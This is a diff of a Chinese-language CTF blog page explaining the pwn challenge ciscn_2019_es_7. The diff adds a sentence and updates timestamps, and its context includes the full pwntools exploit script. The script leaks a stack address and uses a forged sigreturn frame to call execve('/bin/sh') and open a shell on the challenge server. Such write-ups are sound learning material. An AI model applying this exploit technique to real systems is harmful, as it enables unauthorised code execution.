@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="4eriri&#39;s blog">
 <meta property="og:description" content="SROP，甚至比CTFWIKI上的例题简单。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-02T15:17:27.886Z">
+<meta property="og:updated_time" content="2019-08-02T16:23:24.321Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ciscn_2019_es_7">
 <meta name="twitter:description" content="SROP，甚至比CTFWIKI上的例题简单。">
@@ -231,7 +231,7 @@
 <p>调用syscall read&amp;write，之后直接retn。</p>
 <p>同时给了两个gadget，方便修改rax为相应的系统调用号。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 0Fh   //constants.SYS_sigreturn</span><br><span class="line">retn </span><br><span class="line">mov     rax, 3Bh	  //constants.SYS_execve</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-<p>CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。</p>
+<p>CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。也可以直接手动找gadgets把参数传好，然后利用<code>mov     rax, 3Bh        syscall</code>执行execve(“/bin/sh”,0,0)，不过感觉找gadgets比上CTFWIKI麻烦2333</p>
 <h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7.dms&quot;)context.arch=&apos;amd64&apos;sh=remote(&quot;f.buuoj.cn&quot;,20179)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280  # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
@@ -243,7 +243,7 @@
         <p><span>本文标题:</span><a href="/2019/08/02/ciscn-2019-es-7/">ciscn_2019_es_7</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2019-08-02, 23:10:37</p>
-        <p><span>最后更新:</span>2019-08-02, 23:17:27</p>
+        <p><span>最后更新:</span>2019-08-03, 00:23:24</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/08/02/ciscn-2019-es-7/" title="ciscn_2019_es_7">http://yoursite.com/2019/08/02/ciscn-2019-es-7/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/02/ciscn-2019-es-7/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
